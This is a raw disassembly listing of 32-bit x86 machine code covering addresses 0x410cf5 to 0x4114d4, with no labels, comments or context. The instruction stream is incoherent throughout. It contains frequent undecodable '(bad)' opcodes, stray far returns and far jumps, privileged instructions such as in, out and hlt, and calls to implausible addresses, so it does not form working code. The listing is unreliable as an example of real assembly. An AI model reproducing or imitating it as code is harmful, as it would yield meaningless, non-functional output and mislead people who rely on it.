  410cf5:	stc    
  410cf6:	shl    DWORD PTR [ebp-0x30],0xc6
  410cfa:	xor    al,0x0
  410cfc:	inc    ebp
  410cfd:	xchg   BYTE PTR [ebx],al
  410cff:	add    esp,edi
  410d01:	add    BYTE PTR [ebp-0x39],cl
  410d04:	mov    al,bl
  410d06:	test   DWORD PTR [ebx+0x1c348375],ecx
  410d0c:	sub    al,0xbf
  410d0e:	jmp    0x410c95
  410d10:	mov    edi,eax
  410d12:	lock jge 0x410d06
  410d15:	lea    esi,[edx-0x74bad503]
  410d1b:	mov    ebp,esp
  410d1d:	or     cl,dh
  410d1f:	leave  
  410d20:	add    al,BYTE PTR [eax+eax*4-0x37ff9d00]
  410d27:	dec    ebp
  410d28:	dec    ebp
  410d29:	test   DWORD PTR [ebx],eax
  410d2b:	paddb  mm6,mm0
  410d2e:	add    DWORD PTR [eax],eax
  410d30:	dec    ebp
  410d31:	mov    ecx,DWORD PTR [ebx-0x62b217f0]
  410d37:	mov    esi,DWORD PTR [edx]
  410d39:	or     al,0x2b
  410d3b:	dec    ebp
  410d3c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410d42:	mov    esp,ebp
  410d44:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410d4b:	mov    DWORD PTR [ebx],ebp
  410d4d:	call   0xc74967d
  410d52:	mov    DWORD PTR [ebp+0x10],ecx
  410d55:	(bad)  
  410d56:	push   0x8b85ff10
  410d5b:	clc    
  410d5c:	or     al,0x56
  410d5e:	(bad)  
  410d5f:	push   ecx
  410d60:	retf   
  410d61:	mov    ebx,0xff4d8dc8
  410d66:	mov    DWORD PTR [ebp+0x8],eax
  410d69:	xor    eax,DWORD PTR [ebp-0x75]
  410d6c:	cmp    ebp,DWORD PTR [ebx]
  410d6e:	lsl    ebx,WORD PTR [edi-0x8]
  410d72:	call   DWORD PTR [ebx-0x741bff75]
  410d78:	(bad)  
  410d79:	or     al,0x5b
  410d7b:	dec    ebp
  410d7c:	or     BYTE PTR [ebx],dh
  410d7e:	inc    ebp
  410d7f:	xor    esi,DWORD PTR ds:0x708088d
  410d85:	in     eax,0x9d
  410d87:	add    BYTE PTR [edx],dh
  410d89:	inc    ebp
  410d8a:	pop    edi
  410d8b:	xor    eax,edx
  410d8d:	test   DWORD PTR [eax],0x83108b8b
  410d93:	dec    ebp
  410d94:	adc    al,0x33
  410d96:	inc    ebp
  410d97:	xor    esi,DWORD PTR ds:0xc73b9c2b
  410d9d:	jne    0x410d9b
  410d9f:	mov    eax,DWORD PTR [ebp+0x345f808]
  410da5:	mov    eax,DWORD PTR [ebp-0xc]
  410da8:	mov    DWORD PTR [eax],0x685c9f4
  410dae:	clc    
  410daf:	dec    eax
  410db0:	push   edi
  410db1:	ss inc ebp
  410db3:	pop    ss
  410db4:	aad    0x4d
  410db6:	xlat   BYTE PTR ds:[ebx]
  410db7:	or     BYTE PTR [ebx+0x4d63fc56],0xd1
  410dbe:	mov    eax,0x780084d
  410dc3:	push   esi
  410dc4:	clc    
  410dc5:	ret    0xe99d
  410dc8:	xor    dl,dl
  410dca:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410dd0:	js     0x88799cf
  410dd6:	dec    ebp
  410dd7:	push   ebp
  410dd8:	mov    edi,DWORD PTR [eax+0xc872fc]
  410dde:	lock enter 0xceca,0xf2
  410de3:	retf   0x18ce
  410de6:	jne    0x410e35
  410de8:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410dee:	enter  0xf0d6,0xca
  410df2:	retf   0xf2c8
  410df5:	into   
  410df6:	out    dx,al
  410df7:	dec    ebp
  410df8:	dec    ebp
  410df9:	jmp    0xff450d31
  410dfe:	xor    eax,DWORD PTR [ebp-0x15]
  410e01:	xor    esi,DWORD PTR [ebx]
  410e03:	mov    esi,DWORD PTR [ebx]
  410e05:	sub    eax,DWORD PTR [ebx]
  410e07:	add    eax,DWORD PTR [ebx]
  410e09:	or     bl,dl
  410e0b:	dec    ebp
  410e0c:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410e12:	xor    eax,DWORD PTR [ebp-0xf00073]
  410e18:	jb     0x410e5f
  410e1a:	add    BYTE PTR [ebx],dh
  410e1c:	dec    ebp
  410e1d:	pop    esi
  410e1e:	mov    ebp,ebx
  410e20:	cld    
  410e21:	mov    esi,eax
  410e23:	call   0x520f64f0
  410e28:	stc    
  410e29:	add    eax,0x4572aa
  410e2e:	pop    edi
  410e2f:	leave  
  410e30:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410e37:	in     al,dx
  410e38:	mov    eax,edi
  410e3a:	xor    eax,0xf8008520
  410e40:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410e47:	mov    eax,DWORD PTR [ebp-0x77]
  410e4a:	xor    bh,al
  410e4c:	pushf  
  410e4d:	inc    ebp
  410e4e:	(bad)  
  410e4f:	cmp    eax,0x56869ce8
  410e54:	clc    
  410e55:	mov    edi,0x8518e4ec
  410e5b:	jmp    0xf056:0x8b457df8
  410e62:	push   esi
  410e63:	push   esi
  410e64:	push   ecx
  410e65:	push   ecx
  410e66:	push   edi
  410e67:	xor    eax,esi
  410e69:	mov    edx,0x32729d
  410e6e:	add    ecx,eax
  410e70:	mov    edx,edi
  410e72:	clc    
  410e73:	retf   0xaf45
  410e76:	cmp    eax,0xc78b9ceb
  410e7b:	clc    
  410e7c:	cld    
  410e7d:	jne    0x410e97
  410e7f:	xor    ebp,edx
  410e81:	xor    eax,DWORD PTR [ebp+0x3]
  410e84:	or     BYTE PTR [ebx],al
  410e86:	add    BYTE PTR [ebp-0x7747475],al
  410e8c:	hlt    
  410e8d:	dec    ebp
  410e8e:	dec    ebp
  410e8f:	je     0x410ec4
  410e91:	xor    esi,DWORD PTR [ebx]
  410e93:	xor    eax,DWORD PTR [ebx]
  410e95:	add    eax,DWORD PTR [ebx]
  410e97:	add    ecx,DWORD PTR [edi]
  410e99:	rol    ecx,cl
  410e9b:	mov    esi,DWORD PTR [ecx]
  410e9d:	in     al,dx
  410e9e:	inc    ebp
  410e9f:	enter  0xca2b,0x33
  410ea3:	icebp  
  410ea4:	mov    DWORD PTR [edx],ecx
  410ea6:	clc    
  410ea7:	lock pop ebp
  410ea9:	enter  0xf2e8,0xfe
  410ead:	retf   0xeeff
  410eb0:	inc    ebp
  410eb1:	jne    0x410e3e
  410eb3:	mov    edi,eax
  410eb5:	cld    
  410eb6:	dec    ebp
  410eb7:	enter  0xbc89,0x8d
  410ebb:	popf   
  410ebc:	sti    
  410ebd:	xor    bh,bh
  410ebf:	mov    eax,DWORD PTR [ebp-0xc]
  410ec2:	mov    esi,DWORD PTR [ebp-0x4]
  410ec5:	xor    eax,esi
  410ec7:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9d]
  410ece:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410ed4:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410eda:	(bad)  
  410edb:	push   ebp
  410edc:	shr    esp,0x4d
  410edf:	in     al,dx
  410ee0:	cmp    eax,DWORD PTR [esi+esi*2]
  410ee3:	add    BYTE PTR [ebx-0x39ca1bbb],cl
  410ee9:	pushf  
  410eea:	mov    edi,0x85c7f445
  410ef0:	call   0xf88695ed
  410ef5:	xor    eax,0x53619cdb
  410efa:	dec    ebp
  410efb:	inc    ebp
  410efc:	mov    esi,DWORD PTR [eax+edi*8]
  410eff:	pushf  
  410f00:	into   
  410f01:	mov    ecx,edi
  410f03:	in     al,dx
  410f04:	call   0x8b4954c7
  410f09:	pop    es
  410f0a:	or     BYTE PTR [ebx],dh
  410f0c:	or     BYTE PTR [edi+0x8a724d],bh
  410f12:	or     eax,edi
  410f14:	push   ebp
  410f15:	inc    ebp
  410f16:	cmpxchg8b (bad)
  410f17:	(bad)  
  410f18:	leave  
  410f19:	loopne 0x410ee5
  410f1b:	test   DWORD PTR [ebp-0x8],ecx
  410f1e:	mov    eax,DWORD PTR [ebp-0x18]
  410f21:	aad    0x55
  410f23:	xlat   BYTE PTR ds:[ebx]
  410f24:	xor    eax,edi
  410f26:	add    esi,eax
  410f28:	and    eax,DWORD PTR [eax]
  410f2a:	mov    eax,DWORD PTR [eax]
  410f2c:	(bad)  
  410f2d:	leave  
  410f2e:	sti    
  410f2f:	inc    ebp
  410f30:	dec    DWORD PTR [ebx-0x39cc13ab]
  410f36:	mov    esi,ecx
  410f38:	clc    
  410f39:	(bad)  
  410f3a:	dec    ebp
  410f3b:	iret   
  410f3c:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410f42:	jb     0x410f40
  410f44:	add    bh,al
  410f46:	inc    ebp
  410f47:	(bad)  
  410f48:	mov    eax,DWORD PTR [ebp-0xc]
  410f4b:	(bad)  
  410f4c:	xabort 0x63
  410f4f:	loopne 0x410f1e
  410f51:	jmp    FWORD PTR [ebx]
  410f53:	mov    DWORD PTR [ebx],eax
  410f55:	clc    
  410f56:	lock inc ebp
  410f58:	dec    ebp
  410f59:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410f5f:	loopne 0x410f94
  410f61:	inc    DWORD PTR [ebx]
  410f63:	mov    edi,DWORD PTR [ebx]
  410f65:	hlt    
  410f66:	jne    0x410fb5
  410f68:	mov    esi,DWORD PTR [ebx]
  410f6a:	in     al,0x8d
  410f6c:	dec    ebp
  410f6d:	or     BYTE PTR [ebx],dh
  410f6f:	jb     0x410f74
  410f71:	add    BYTE PTR [edi+0x45],bl
  410f74:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410f7a:	add    BYTE PTR [ebx],dh
  410f7c:	mov    esi,DWORD PTR [ebx]
  410f7e:	mov    ebp,DWORD PTR [ebx]
  410f80:	sbb    BYTE PTR [ebx-0x377403b3],cl
  410f86:	nop
  410f87:	mov    ecx,0x338b4500
  410f8c:	add    DWORD PTR [ebx],0x70
  410f8f:	mov    DWORD PTR [esi-0x8],edx
  410f92:	jne    0x410fd9
  410f94:	mov    esi,DWORD PTR [edi+edx*2]
  410f97:	pushf  
  410f98:	push   esi
  410f99:	mov    edx,DWORD PTR [ecx-0x15]
  410f9c:	xor    ecx,DWORD PTR [ebx+0x4572e0bb]
  410fa2:	add    BYTE PTR [ebx],dh
  410fa4:	retf   
  410fa5:	add    edx,ecx
  410fa7:	ror    DWORD PTR [edi],cl
  410fa9:	mov    DWORD PTR ds:0x7f452dfc,ebp
  410faf:	mov    ch,dl
  410fb1:	mov    BYTE PTR [eax+0xb],dh
  410fb4:	fimul  WORD PTR [ebp+0x0]
  410fb7:	mov    ecx,DWORD PTR [ebx+0x55b608f8]
  410fbd:	xor    esi,DWORD PTR [ebx]
  410fbf:	mov    DWORD PTR [ebx],esi
  410fc1:	or     BYTE PTR [ebx],al
  410fc3:	dec    ebp
  410fc4:	add    ecx,DWORD PTR [ebx-0x318af7c5]
  410fca:	or     edi,0x8c64ca9c
  410fd0:	out    dx,eax
  410fd1:	loopne 0x410fe8
  410fd3:	(bad)  
  410fd4:	jmp    0x13d1464
  410fd9:	retf   0x4d4d
  410fdc:	xor    ecx,DWORD PTR [ebx-0x31c40bfd]
  410fe2:	je     0x3241ad8c
  410fe8:	mov    ecx,DWORD PTR [ecx+0x45450818]
  410fee:	mov    DWORD PTR [ebx],esi
  410ff0:	sbb    BYTE PTR [ecx-0x7472b3],bh
  410ff6:	mov    eax,ecx
  410ff8:	fmul   DWORD PTR [ebp+0x45]
  410ffb:	mov    DWORD PTR ds:0xba459cf0,esi
  411001:	mov    eax,DWORD PTR [ebp+0x55c6f8f0]
  411007:	(bad)  
  411008:	mov    ecx,eax
  41100a:	sbb    BYTE PTR [ecx-0x7474babb],dl
  411010:	sbb    al,bh
  411012:	add    dh,0x1
  411015:	mov    DWORD PTR [eax],0x4dc1005e
  41101b:	leave  
  41101c:	mov    eax,DWORD PTR [eax+ebx*1]
  41101f:	push   ebp
  411020:	mov    esp,ebp
  411022:	add    DWORD PTR [ebp+0x0],eax
  411025:	mov    ecx,DWORD PTR [ecx]
  411027:	or     BYTE PTR [eax-0x80],cl
  41102a:	mov    DWORD PTR [ecx],eax
  41102c:	or     al,0x0
  41102e:	inc    ebp
  41102f:	add    BYTE PTR [ebx],dh
  411031:	in     al,dx
  411032:	add    edx,DWORD PTR [ebx-0x77]
  411035:	mov    esi,esp
  411037:	adc    BYTE PTR [ebp+0x16],al
  41103a:	xor    edi,DWORD PTR [edi+0x7890803]
  411040:	adc    al,0xcf
  411042:	inc    ebp
  411043:	popf   
  411044:	mov    esi,DWORD PTR [edx]
  411046:	push   eax
  411047:	add    ebp,eax
  411049:	cmp    ecx,DWORD PTR [ecx+0x4581d075]
  41104f:	pushf  
  411050:	mov    esp,DWORD PTR [eax+edi*1+0x44]
  411054:	dec    ebp
  411055:	fwait
  411056:	dec    eax
  411057:	jmp    0xcc149d
  41105c:	or     al,0x4d
  41105e:	sbb    BYTE PTR [ebx-0x3074f3c0],cl
  411064:	or     al,0xd7
  411066:	dec    ecx
  411067:	retf   
  411068:	dec    eax
  411069:	rcl    eax,cl
  41106b:	retf   0xfc8
  41106e:	inc    ebp
  41106f:	or     eax,0x7f382d8b
  411074:	sar    esp,0x3
  411077:	lahf   
  411078:	inc    eax
  411079:	mov    ebp,0x8b180089
  41107e:	inc    ebp
  41107f:	or     BYTE PTR [ebx],dh
  411081:	iret   
  411082:	add    ecx,ebx
  411084:	mov    ecx,eax
  411086:	adc    al,0x84
  411088:	inc    ebp
  411089:	add    al,0x33
  41108b:	add    BYTE PTR [ebx],al
  41108d:	dec    ebp
  41108e:	mov    DWORD PTR [ecx+0x4d45dc14],ecx
  411094:	mov    ecx,DWORD PTR [ebx+0x6c714d4]
  41109a:	ret    
  41109b:	inc    ebp
  41109c:	add    edi,eax
  41109e:	push   ebp
  41109f:	or     bh,al
  4110a1:	test   DWORD PTR [eax+edi*8],edx
  4110a4:	test   DWORD PTR [edx],esi
  4110a6:	clc    
  4110a7:	pushf  
  4110a8:	inc    ebp
  4110a9:	mov    DWORD PTR [eax],esi
  4110ab:	lock pushf 
  4110ad:	inc    ebp
  4110ae:	(bad)  
  4110af:	mov    DWORD PTR [eax+ebx*1],edx
  4110b2:	test   DWORD PTR [ebp-0x8],eax
  4110b5:	mov    eax,DWORD PTR [ebp-0x70]
  4110b8:	mov    eax,DWORD PTR [eax]
  4110ba:	sbb    BYTE PTR [ebx-0x2b3c7639],cl
  4110c0:	scas   eax,DWORD PTR es:[edi]
  4110c1:	dec    ebp
  4110c2:	mov    ecx,DWORD PTR [ebx+0x559008]
  4110c8:	xor    ecx,DWORD PTR [ebx+0x3c11038d]
  4110ce:	jb     0x41111d
  4110d0:	add    BYTE PTR [ebx-0x387cf73f],cl
  4110d6:	add    eax,ebx
  4110d8:	add    BYTE PTR [ebp+0x45],al
  4110db:	mov    esi,DWORD PTR [ebx]
  4110dd:	or     BYTE PTR [ebx],al
  4110df:	(bad)  
  4110e0:	mov    ebx,eax
  4110e2:	adc    al,0x45
  4110e4:	inc    ebp
  4110e5:	mov    eax,DWORD PTR [ebx]
  4110e7:	or     al,0xdc
  4110e9:	inc    eax
  4110ea:	inc    ebp
  4110eb:	cmp    edi,0xc
  4110ee:	hlt    
  4110ef:	inc    ebp
  4110f0:	jne    0x41107d
  4110f2:	mov    ecx,DWORD PTR [esp+ecx*1]
  4110f5:	inc    eax
  4110f6:	bound  ecx,QWORD PTR [ebx-0x7a76f301]
  4110fc:	clc    
  4110fd:	push   esp
  4110fe:	inc    ebp
  4110ff:	inc    ebp
  411100:	cmp    eax,0x8b8b9c74
  411105:	cmp    al,ah
  411107:	dec    ebp
  411108:	(bad)  
  411109:	mov    eax,ebx
  41110b:	push   esp
  41110c:	(bad)  
  41110d:	idiv   DWORD PTR [eax-0x87417dd]
  411113:	or     al,0xff
  411115:	inc    eax
  411116:	inc    ebp
  411117:	add    eax,DWORD PTR [ebp-0x74748b15]
  41111d:	push   esp
  41111e:	loopne 0x411165
  411120:	(bad)  
  411121:	mov    eax,ebx
  411123:	or     bh,bh
  411125:	xbegin 0x508656ee
  41112b:	mov    ebx,esp
  41112d:	or     bh,bh
  41112f:	(bad)  
  411130:	mov    eax,ebx
  411132:	hlt    
  411133:	inc    ebp
  411134:	inc    ebp
  411135:	mov    ecx,DWORD PTR [ebx+0x4d4de008]
  41113b:	xor    ebp,DWORD PTR [ebx]
  41113d:	add    ecx,DWORD PTR [ecx+0x4589e089]
  411143:	adc    al,0x8b
  411145:	inc    ebp
  411146:	clc    
  411147:	xor    eax,DWORD PTR [eax-0x64]
  41114a:	add    eax,edi
  41114c:	or     al,0x14
  41114e:	dec    ebp
  41114f:	test   DWORD PTR [ebx],edi
  411151:	clc    
  411152:	jb     0x411199
  411154:	mov    esi,DWORD PTR [ecx]
  411156:	clc    
  411157:	pushf  
  411158:	inc    eax
  411159:	mov    ecx,DWORD PTR [ebx+0x414df8f0]
  41115f:	xor    ecx,DWORD PTR [ebx-0x3ef01ffd]
  411165:	shr    esi,0x4d
  411168:	add    BYTE PTR [ebx-0x30002f96],cl
  41116e:	hlt    
  41116f:	mov    WORD PTR [ebp-0x63],es
  411172:	push   eax
  411173:	xor    dl,BYTE PTR [ebx+edi*1-0x5347f001]
  41117a:	test   DWORD PTR [eax],eax
  41117c:	clc    
  41117d:	mov    eax,DWORD PTR [ebp+0x8]
  411180:	mov    edi,0x4585c3c8
  411186:	clc    
  411187:	mov    eax,DWORD PTR [ebp+0x18]
  41118a:	xor    eax,DWORD PTR [ebp-0x64]
  41118d:	mov    edi,eax
  41118f:	hlt    
  411190:	shl    BYTE PTR [ebp-0x7b],0x8b
  411194:	clc    
  411195:	fmul   QWORD PTR [ebp+0x4d]
  411198:	mov    eax,ebp
  41119a:	in     al,dx
  41119b:	icebp  
  41119c:	dec    ebp
  41119d:	dec    DWORD PTR [ecx+0x4dc7e845]
  4111a3:	loopne 0x41112e
  4111a5:	test   eax,edi
  4111a7:	clc    
  4111a8:	dec    ebp
  4111a9:	inc    ebp
  4111aa:	mov    DWORD PTR [ebx],esi
  4111ac:	in     al,0x3
  4111ae:	dec    ebp
  4111af:	push   eax
  4111b0:	xor    eax,DWORD PTR [ebp+0x3]
  4111b3:	push   eax
  4111b4:	mov    DWORD PTR [eax-0x20],edx
  4111b7:	push   edi
  4111b9:	mov    eax,DWORD PTR [eax]
  4111bb:	clc    
  4111bc:	cmp    eax,0xf84e85c0
  4111c1:	inc    ebp
  4111c2:	test   BYTE PTR [ebx],dh
  4111c4:	add    DWORD PTR [ebx],eax
  4111c6:	add    BYTE PTR [eax+0x4d],dl
  4111c9:	jne    0x4111fe
  4111cb:	lea    ecx,[ebx-0x7617fc48]
  4111d1:	cmc    
  4111d2:	adc    al,0xff
  4111d4:	inc    ebp
  4111d5:	inc    ebp
  4111d6:	xor    ecx,DWORD PTR [ecx+0x4530e08d]
  4111dc:	jb     0x411169
  4111de:	add    ah,bl
  4111e0:	inc    ebp
  4111e1:	ror    DWORD PTR [ebx+0x4d8bf045],0xf8
  4111e8:	xor    ecx,DWORD PTR [ebp+0x3]
  4111eb:	mov    edi,DWORD PTR [ebx]
  4111ed:	adc    BYTE PTR [ebp+0x41],dh
  4111f0:	mov    ecx,DWORD PTR [ebx-0x37381ff8]
  4111f6:	ret    
  4111f7:	push   ss
  4111f8:	push   0x45
  4111fa:	lea    ecx,[ebx+0x4de80cac]
  411200:	cli    
  411201:	add    edi,edi
  411203:	or     BYTE PTR [ebp+0x4d],al
  411206:	mov    ebp,DWORD PTR [ebx]
  411208:	xor    ebp,ecx
  41120a:	mov    al,BYTE PTR [edx]
  41120c:	add    eax,0xc7200
  411211:	jne    0x411260
  411213:	lea    esi,[ebx]
  411215:	lods   al,BYTE PTR ds:[esi]
  411216:	psubsb mm0,mm0
  411219:	cmc    
  41121a:	retf   
  41121b:	inc    ecx
  41121d:	xor    eax,0x89019c84
  411222:	add    ah,cl
  411224:	inc    ebp
  411225:	inc    ebp
  411226:	mov    esi,DWORD PTR [edx]
  411228:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c405c7]
  41122f:	test   DWORD PTR [eax],eax
  411231:	clc    
  411232:	dec    ebp
  411233:	inc    ebp
  411234:	xor    esi,DWORD PTR [eax]
  411236:	setl   al
  411239:	(bad)  
  41123a:	retf   
  41123b:	int3   
  41123c:	ror    DWORD PTR [ebp-0x7c],0x8d
  411240:	add    eax,ecx
  411242:	add    BYTE PTR [ebp+0x45],cl
  411245:	lea    ecx,[ebx-0x75b2cc3c]
  41124b:	lea    eax,ds:0x4d72c0
  411251:	mov    ecx,DWORD PTR [ebp+0x8]
  411254:	xor    ecx,edi
  411256:	bswap  ebx
  411258:	ror    BYTE PTR [ebp-0x35],0xe9
  41125c:	rol    DWORD PTR [ecx],0x84
  41125f:	add    BYTE PTR [ecx],al
  411261:	xor    eax,DWORD PTR [eax]
  411263:	pushf  
  411264:	inc    ebp
  411265:	jnp    0x8a414669
  41126b:	mov    eax,DWORD PTR ds:0xcf72f0
  411271:	lock dec ebp
  411273:	retf   
  411274:	xor    ecx,DWORD PTR [ebp+0xf]
  411277:	mov    eax,eax
  411279:	loopne 0x411246
  41127b:	test   ecx,0x19d8484
  411281:	xor    al,BYTE PTR [eax]
  411283:	mov    DWORD PTR [ebp-0x20],eax
  411286:	mov    eax,DWORD PTR [ebp+0x33]
  411289:	mov    ecx,DWORD PTR [edx+0x72c705e0]
  41128f:	ret    
  411290:	add    al,cl
  411292:	dec    ebp
  411293:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  411299:	add    ecx,DWORD PTR ds:0xc7250
  41129f:	inc    ebp
  4112a0:	rcl    DWORD PTR [eax+0x4d],0x5f
  4112a4:	mov    edi,edi
  4112a6:	xor    ecx,DWORD PTR [ebx+0xdec8a]
  4112ac:	jb     0x411275
  4112ae:	add    BYTE PTR [ecx+eax*8-0x74cdb2b7],al
  4112b5:	mov    esi,DWORD PTR [ebx]
  4112b7:	or     BYTE PTR [edx+0x72b60dcf],cl
  4112bd:	add    eax,DWORD PTR [eax]
  4112bf:	cmp    ecx,eax
  4112c1:	jne    0x41133f
  4112c7:	mov    eax,DWORD PTR [ebp-0x18]
  4112ca:	mov    eax,DWORD PTR [eax]
  4112cc:	xor    eax,edi
  4112ce:	mov    al,BYTE PTR [ebp+eax*1+0x327249]
  4112d5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112d8:	mov    ecx,edi
  4112da:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4112e0:	jb     0x4112f1
  4112e2:	add    BYTE PTR [eax-0x3f],bl
  4112e5:	add    BYTE PTR [ebp-0x75],cl
  4112e8:	mov    edi,eax
  4112ea:	xor    eax,DWORD PTR [eax]
  4112ec:	mov    al,bh
  4112ee:	or     eax,0x497284
  4112f3:	xor    al,cl
  4112f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4112f8:	mov    ecx,edi
  4112fa:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  411300:	jb     0x411311
  411302:	add    BYTE PTR [eax],bh
  411304:	enter  0x8500,0x8b
  411308:	add    ah,ah
  41130a:	add    BYTE PTR [eax],al
  41130c:	inc    ebp
  41130d:	(bad)  
  41130e:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a49]
  411315:	mov    esi,DWORD PTR [edx+0x8]
  411318:	add    bh,cl
  41131a:	dec    ebp
  41131b:	mov    dh,0x8b
  41131d:	add    esi,DWORD PTR [ebx]
  41131f:	cmp    ecx,DWORD PTR [edx+0x72180d0f]
  411325:	add    BYTE PTR [eax],al
  411327:	mov    eax,ecx
  411329:	call   0xc7cc137b
  41132e:	xor    eax,DWORD PTR [edx+ecx*4+0x72320d49]
  411335:	mov    eax,DWORD PTR [eax]
  411337:	in     al,dx
  411338:	ror    DWORD PTR [ecx],0x4d
  41133b:	iret   
  41133c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a49]
  411343:	xor    dh,BYTE PTR [edx-0x75]
  411346:	add    al,bh
  411348:	enter  0x5009,0xcf
  41134c:	inc    ebp
  41134d:	mov    WORD PTR [ebx-0x75cdccb7],cs
  411353:	or     al,BYTE PTR ds:0xec728b
  411359:	or     DWORD PTR [ebp-0x31],ecx
  41135c:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4d]
  411363:	cmp    dh,BYTE PTR [edx+0xf]
  411366:	add    ah,dl
  411368:	rol    DWORD PTR [eax],0x4d
  41136b:	mov    ecx,DWORD PTR [ebx-0x75ffcc08]
  411371:	(bad)  
  411372:	or     eax,0x497284
  411377:	xor    al,cl
  411379:	mov    ecx,DWORD PTR [ebp-0x18]
  41137c:	mov    ecx,DWORD PTR [ecx]
  41137e:	xor    ecx,edi
  411380:	mov    cl,BYTE PTR [ebp+ecx*1+0x327249]
  411387:	xor    cl,al
  411389:	mov    edx,DWORD PTR [eax]
  41138b:	in     al,0x45
  41138d:	or     DWORD PTR [eax-0x31],edx
  411390:	mov    ds:0x8b49ff8c,eax
  411395:	xor    dh,BYTE PTR [edx+ecx*1-0x17f5743f]
  41139c:	inc    ebp
  41139d:	or     DWORD PTR [ebx],esi
  41139f:	iret   
  4113a0:	add    ecx,DWORD PTR [ecx+ecx*4+0x4532144d]
  4113a7:	cmp    dh,BYTE PTR [ebx]
  4113a9:	jge    0x7241443f
  4113af:	mov    eax,DWORD PTR [eax]
  4113b1:	in     al,0xc7
  4113b3:	add    BYTE PTR [ebp-0x39],cl
  4113b6:	mov    eax,DWORD PTR [esp+edx*1-0x34cd30b7]
  4113bd:	mov    edx,ecx
  4113bf:	clc    
  4113c0:	test   BYTE PTR [ecx],cl
  4113c2:	std    
  4113c3:	iret   
  4113c4:	dec    DWORD PTR [ebp+eax*2+0x14328b49]
  4113cb:	xor    al,bh
  4113cd:	mov    eax,ebx
  4113cf:	in     al,dx
  4113d0:	enter  0x1109,0xcf
  4113d4:	inc    ebp
  4113d5:	mov    WORD PTR [ebx-0x38cde7b7],cs
  4113db:	or     al,BYTE PTR [ebx+ecx*4+0x932f89d]
  4113e2:	jmp    0x4113b3
  4113e4:	push   0xffffff8c
  4113e6:	dec    DWORD PTR [ebp-0xc]
  4113e9:	xor    al,BYTE PTR [ebp+0x3a]
  4113ec:	push   eax
  4113ed:	jne    0x411409
  4113ef:	mov    edi,edi
  4113f1:	in     al,0x8b
  4113f3:	add    BYTE PTR [eax],cl
  4113f5:	(bad)  
  4113f6:	dec    ebp
  4113f7:	test   BYTE PTR [ebx],dh
  4113f9:	dec    ecx
  4113fa:	add    esi,DWORD PTR [edx]
  4113fc:	cmp    ecx,DWORD PTR [ebx+0x98bec74]
  411402:	or     bh,cl
  411404:	(bad)  
  411405:	mov    ebx,es
  411407:	dec    ecx
  411408:	push   0x32
  41140a:	lea    esi,[edx]
  41140c:	xchg   esp,eax
  41140d:	mov    ebp,eax
  41140f:	call   0xd0401e0c
  411414:	inc    ebp
  411415:	mov    WORD PTR [ebx+0x45321849],es
  41141b:	or     bh,bh
  41141d:	mov    ebp,DWORD PTR [eax-0x74f68a1c]
  411423:	iret   
  411424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411425:	mov    WORD PTR [ebp+0x4d],es
  411428:	push   eax
  411429:	xor    bl,dh
  41142b:	cmp    bh,bh
  41142d:	jne    0x4113ba
  41142f:	lea    ecx,[eax]
  411431:	lods   al,BYTE PTR ds:[esi]
  411432:	dec    ebp
  411433:	call   0xff450e6b
  411438:	cmp    ecx,DWORD PTR [ebp+0x74]
  41143b:	cmp    ebp,DWORD PTR [edx+0x74]
  41143e:	dec    DWORD PTR [ebx-0x38baf758]
  411444:	add    eax,ebx
  411446:	fadd   DWORD PTR [ebp-0x18]
  411449:	mov    edi,eax
  41144b:	lock inc edi
  41144e:	inc    ebp
  41144f:	test   BYTE PTR [ebx+0x832a89d],cl
  411455:	xor    eax,DWORD PTR [ebp-0x75]
  411458:	add    ecx,DWORD PTR [eax]
  41145a:	sbb    BYTE PTR [ebp+0x45],dl
  41145d:	xor    ecx,DWORD PTR [ebx+0x4d3bf003]
  411463:	rdpmc  
  411465:	test   DWORD PTR [ebx],0xc18b0fff
  41146b:	or     BYTE PTR [ebp+0x4d],cl
  41146e:	mov    esi,DWORD PTR [ebx]
  411470:	rol    BYTE PTR [ebx],1
  411472:	iret   
  411473:	cmp    ecx,DWORD PTR [ebp+esi*2-0xfcd7463]
  41147a:	cmp    ecx,DWORD PTR [ebp+0xf]
  41147d:	xor    edx,DWORD PTR [edi-0x73]
  411480:	dec    DWORD PTR [eax]
  411482:	mov    esi,DWORD PTR [edx+0x10]
  411485:	add    BYTE PTR [ebp+0x77],al
  411488:	mov    DWORD PTR [eax],ebx
  41148a:	jmp    0x411501
  41148c:	or     DWORD PTR [ebp-0x179b6b64],0xff65f3bf
  411496:	pop    edi
  411497:	inc    ebp
  411498:	pop    ebx
  411499:	mov    eax,edx
  41149b:	loopne 0x41149d
  41149d:	(bad)  
  41149e:	mov    eax,ebx
  4114a0:	push   ecx
  4114a1:	ror    DWORD PTR [ebx+0x4d450813],0x33
  4114a8:	push   esi
  4114a9:	add    edi,DWORD PTR [edi+0x7180850]
  4114af:	inc    ebp
  4114b0:	(bad)  
  4114b1:	push   eax
  4114b2:	popf   
  4114b3:	dec    edi
  4114b4:	xor    bh,bh
  4114b6:	add    ecx,DWORD PTR [ebx-0x3f740b77]
  4114bc:	adc    al,0x89
  4114be:	adc    BYTE PTR [ecx+eax*1],0x75
  4114c2:	add    bh,bh
  4114c4:	or     BYTE PTR [eax*2-0x6bfc74bb],dl
  4114cb:	fadd   DWORD PTR [eax]
  4114cd:	call   0xff45075d
  4114d2:	cmp    al,0x45
  4114d4:	dec    ebp
